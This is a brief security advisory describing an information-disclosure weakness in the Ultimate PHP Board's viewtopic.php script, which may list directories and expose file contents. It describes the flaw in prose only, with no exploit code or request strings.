Ultimate PHP Board (UPB) is a freely available, open source PHP Bulletin Board. It is available for the Unix and Linux operating systems.

Under some circumstances, it may be possible to disclose the contents of directories. By passing a malicious request to the viewtopic.php script, UPB may return a listing of the directory. This could be futher refined to disclose the contents of selected files.
